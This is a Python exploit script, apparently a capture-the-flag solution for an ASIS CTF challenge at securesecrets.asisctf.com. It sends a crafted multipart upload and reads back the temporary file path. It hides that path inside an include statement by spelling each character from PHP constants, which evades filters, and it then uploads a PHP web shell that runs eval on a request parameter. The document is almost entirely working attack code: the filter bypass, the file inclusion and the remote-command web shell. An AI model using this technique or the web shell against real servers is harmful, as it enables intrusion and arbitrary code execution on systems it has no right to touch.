import socket, requests, re

letters = {
    '0': 'PHP_ZTS',
    '1': 'E_ERROR',
    '2': 'E_WARNING',
    '3': 'ZLIB_RLE',
    '4': 'E_PARSE',
    '5': 'ZLIB_BLOCK',
    '6': 'INPUT_SESSION',
    '7': 'UPLOAD_ERR_CANT_WRITE',
    '8': 'E_NOTICE',
    '9': 'IMAGETYPE_JPC',

    'A': 'OPENSSL_DEFAULT_STREAM_CIPHERS[E_NOTICE]',
    'C': 'OPENSSL_DEFAULT_STREAM_CIPHERS[E_ERROR]',
    'D': 'OPENSSL_DEFAULT_STREAM_CIPHERS[E_WARNING]',
    'E': 'OPENSSL_DEFAULT_STREAM_CIPHERS[PHP_ZTS]',
    'G': 'OPENSSL_DEFAULT_STREAM_CIPHERS[IMAGETYPE_ICO]',
    'H': 'OPENSSL_DEFAULT_STREAM_CIPHERS[ZLIB_RLE]',
    'I': 'OPENSSL_DEFAULT_STREAM_CIPHERS[ZLIB_BLOCK.E_PARSE.E_WARNING]',
    'L': 'PHP_OS[PHP_ZTS]',
    'M': 'OPENSSL_DEFAULT_STREAM_CIPHERS[E_ERROR.IMAGETYPE_JPC]',
    'N': 'OPENSSL_DEFAULT_STREAM_CIPHERS[ZLIB_BLOCK.ZLIB_BLOCK.ZLIB_BLOCK]',
    'O': 'OPENSSL_VERSION_TEXT[PHP_ZTS]',
    'P': 'DATE_ATOM[E_ERROR.E_WARNING]',
    'R': 'OPENSSL_DEFAULT_STREAM_CIPHERS[INPUT_SESSION]',
    'S': 'OPENSSL_VERSION_TEXT[E_PARSE]',
    'T': 'DATE_ATOM[INPUT_SESSION]',
    'U': 'OPENSSL_DEFAULT_STREAM_CIPHERS[ZLIB_BLOCK.ZLIB_BLOCK.INPUT_SESSION]',
    'X': 'OPENSSL_DEFAULT_STREAM_CIPHERS[ZLIB_BLOCK.INPUT_SESSION.IMAGETYPE_JPC]',
    'Y': 'DATE_ATOM[PHP_ZTS]',

    '/': 'DIRECTORY_SEPARATOR',
    '/': 'PHP_LIBDIR[PHP_ZTS]',
    '-': 'PHP_SAPI[ZLIB_RLE]',
    '_': '_::class',
    '.': 'DEFAULT_INCLUDE_PATH[PHP_ZTS]',
    ':': 'DEFAULT_INCLUDE_PATH[E_ERROR]',
    'a': 'PHP_LIBDIR[E_NOTICE]',
    'b': 'PHP_LIBDIR[ZLIB_BUF_ERROR]',
    'c': 'PHP_SAPI[ZLIB_BLOCK]',
    'd': 'PHP_CONFIG_FILE_SCAN_DIR[ZLIB_ERRNO]',
    'e': 'PHP_DATADIR[PHP_FLOAT_DIG]',
    'f': 'PHP_SAPI[PHP_ZTS]',
    'g': 'PHP_SAPI[INPUT_SESSION]',
    'h': 'PHP_LIBDIR[ZLIB_STREAM_ERROR]',
    'i': 'PHP_OS[E_ERROR]',
    'k': 'ICONV_IMPL[ZLIB_RLE]',
    'l': 'PHP_LIBDIR[ZLIB_BLOCK]',
    'm': 'PHP_SAPI[E_WARNING]',
    'n': 'PHP_OS[E_WARNING]',
    'o': 'PHP_LIBDIR[INPUT_SESSION]',
    'p': 'PHP_SAPI[E_ERROR]',
    'r': 'PHP_LIBDIR[ZLIB_RLE]',
    's': 'PHP_LIBDIR[E_WARNING]',
    't': 'PHP_SYSCONFDIR[POSIX_RLIMIT_MSGQUEUE]',
    'u': 'PHP_OS[ZLIB_RLE]',
    'v': 'PHP_LOCALSTATEDIR[ZLIB_DATA_ERROR]',
    'w': 'ICONV_IMPL[ZLIB_BLOCK]',
    'x': 'PHP_OS[E_PARSE]',
    'z': 'PHP_EXTENSION_DIR[CURLOPT_NOBODY]'
}

def convert(txt):
    arr = []
    for c in txt:
        if c not in letters:
            print("Error: %c not in dict" % c)
            exit()
        else:
            arr.append(letters[c])
    return('.'.join(arr))


req_header = "POST /{0} HTTP/1.1\r\nHost: securesecrets.asisctf.com\r\nUser-Agent: Mozilla/5.0\r\n"
req_header += "Content-Type: multipart/form-data; boundary=------------------------dc559e8685dffcd3\r\n"
req_header += "Content-Length: {1}"

req_body = """--------------------------dc559e8685dffcd3
Content-Disposition: form-data; name="file"; filename="shell"
Content-Type: application/octet-stream

<?php
restore_error_handler();
error_reporting(E_ALL);
echo(__FILE__);
	unlink('/tmp/uploads/patata.php');
    move_uploaded_file($_FILES['file']['tmp_name'], '/tmp/uploads/patata.php');
?>

--------------------------dc559e8685dffcd3--"""

shellfile = """
<?php
    restore_error_handler();
    error_reporting(E_ALL);
    eval($_REQUEST['cmd']);
?>
"""

req_url = "Y0U_CANT_GUESS_THIS_5TUPLFGSGZYWXOKHINMBDWCKAGERCQJV.php?yummy=x:goto+x;"
header = req_header.format(req_url,str(len(req_body)))
request = header + "\r\n\r\n" + req_body + "\r\n\r\n"
print(request)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("securesecrets.asisctf.com",80))
s.send(request)

while True:
    buf = s.recv(1024)

    if 'tmp_name' in buf:
        search = re.findall(r'tmp_name.+(/tmp/uploads/php\w+)', buf)
        print(search)
        if len(search) > 0:
            conv = convert(search[0])
            print(conv)
            url = 'http://securesecrets.asisctf.com/Y0U_CANT_GUESS_THIS_5TUPLFGSGZYWXOKHINMBDWCKAGERCQJV.php?yummy=include+%s;' % conv
            #UPLOAD FILE AND EXECUTE TMPFILE
            files = {'file': ('file.txt', shellfile)}
            r = requests.post(url, files=files)

            print(r.text)
            break

s.close()
